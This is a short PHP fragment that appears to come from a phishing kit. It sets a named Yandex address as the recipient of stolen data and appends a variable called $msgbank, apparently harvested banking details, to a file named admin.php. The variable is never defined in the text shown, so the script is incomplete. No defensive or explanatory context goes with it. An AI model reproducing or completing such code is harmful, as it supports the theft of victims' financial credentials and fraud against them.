<?php

$yourmail  = 'polikaradi@yandex.com';


$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);



?>